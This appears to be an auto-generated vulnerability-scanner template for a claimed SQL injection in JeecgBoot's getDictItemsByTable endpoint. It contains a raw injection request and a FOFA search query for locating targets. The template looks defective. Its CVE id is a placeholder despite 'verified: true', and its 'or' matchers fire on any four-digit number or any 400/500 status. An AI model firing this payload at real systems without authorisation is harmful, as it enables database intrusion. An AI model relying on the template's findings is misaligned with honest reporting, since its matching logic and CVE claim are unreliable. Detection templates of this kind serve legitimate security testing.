http:
    - extractors:
        - group: 1
          part: body
          regex:
            - (SQL syntax.*MySQL.*)
            - (ORA-[0-9]{5}.*)
            - (Microsoft.*ODBC.*SQL.*Server.*)
          type: regex
        - group: 1
          name: extracted_number
          part: body
          regex:
            - '[0-9]{4,}'
          type: regex
      matchers:
        - part: body
          regex:
            - SQL syntax.*MySQL
            - Unclosed quotation mark after the character string
            - near '.*' at line
            - ORA-[0-9]{5}
            - PostgreSQL.*ERROR
            - Microsoft.*ODBC.*SQL.*Server
          type: regex
        - part: body
          regex:
            - '[0-9]{4,}'
          type: regex
        - status:
            - 500
            - 400
          type: status
      matchers-condition: or
      raw:
        - |
          GET /api/sys/ng-alain/getDictItemsByTable/{{test_value}}'%20AND%20(SELECT%20{{rand_int(1000,9999)}})%20AND%20'{{test_value}}'='{{test_value}} HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
          Accept: application/json, text/plain, */*
          Accept-Language: en-US,en;q=0.5
          Accept-Encoding: gzip, deflate
          Connection: close
id: CVE-2025-BBBBB
info:
    author: ProjectDiscoveryAI
    classification:
        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
        cvss-score: 9.8
        cwe-id: CWE-89
    description: |
        JeecgBoot contains a SQL injection vulnerability in the /api/sys/ng-alain/getDictItemsByTable endpoint
        that allows unauthenticated attackers to execute arbitrary SQL commands and potentially access sensitive data.
    metadata:
        fofa-query: app="JEECG Boot"
        max-request: 1
        product: boot
        vendor: jeecg
        verified: true
    name: JeecgBoot SQL Injection Vulnerability
    reference:
        - https://jeecg.com/security
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-BBBBB
        - https://cwe.mitre.org/data/definitions/89.html
    severity: critical
    tags:
        - jeecgboot
        - sql-injection
        - unauthenticated
        - JEECG
        - authenticate
        - PostgreSQL
variables:
    test_value: '{{randstr}}'
